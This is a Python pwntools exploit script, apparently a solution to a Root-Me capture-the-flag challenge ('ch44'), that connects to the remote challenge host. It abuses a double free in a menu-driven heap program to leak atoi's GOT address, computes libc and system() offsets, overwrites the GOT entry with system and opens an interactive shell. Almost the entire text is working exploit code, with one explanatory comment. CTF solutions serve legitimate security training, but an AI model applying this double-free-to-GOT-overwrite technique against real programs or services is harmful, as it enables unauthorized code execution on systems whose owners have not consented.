#!/usr/bin/python
from pwn import *

# ENTRIES
atoi_got = 0x602078

# PROCESS
#c = process("./ch44")
c=remote("challenge03.root-me.org", 56544)

# DIFF LOCAL
libcdiff = 0x39ea0 
sysdiff = 0x46590

# FUNCTIONS
def allocate( nm, age ):
	c.sendline('1')
	c.recvuntil(': ')
	c.sendline( nm )
	c.recvuntil(': ')
	c.sendline( str(age) )
	c.recvuntil('>')
def free( id ):
	c.sendline('2')
	c.recvuntil(': ')
	c.sendline(str(id))
	c.recvuntil('>')
def view( id ):
	c.sendline('4')
	c.recvuntil('[' + str(id) + '] ')
	name = c.recvuntil(', ')[:-2]
	age = c.recvuntil(' years')[:-6]
	c.recvuntil('>')
	return name, age
def edit( id, name, age ):
	c.sendline('3')
	c.recvuntil(': ')
	c.sendline( str(id) )
	c.recvuntil(': ')
	c.sendline( name )
	c.recvuntil(': ')
	c.sendline( str(age) )
	c.recvuntil('>')
def revaddr(addr):
	h = hex(addr)[2:]
	t = ""
	for i in xrange(len(h) - 2, -2, -2):
		m = i + 2
		t += chr(int(h[i:m], 16))
	return t


# EXPLOIT
allocate( 'A'*56, 15 )
allocate( 'B'*56, 15 )
allocate( 'C'*56, 15 )

free(2)
free(1)
free(2)

allocate('D'*56, 15)

free(2)
free(0)

'''
Cause we are requesting just 16 bytes of data, glibc will use next chunk in age's freelist not theone reserved fo name. As a consequence we are able to overwrite name ptr...!!!
This will lead to crash (dereference on EAX) when printing list to stdout (option show).
As a consequence let's write 8 bytes, so two new requests to malloc will fit into one 16 bytes sized chunk. 
'''

allocate('A'*8, 15)
allocate('A'*8+revaddr(atoi_got), 15)

name, age = view(1)
leak=u64(name.ljust(8, "\x00"))
print "atoi() @ " + hex(leak)
libc_base=leak-libcdiff
system=libc_base+sysdiff
print "system() @ " + hex(system)

edit(1, p64(system), 'sh\x00')
# ATTACH
#pause()

c.interactive()
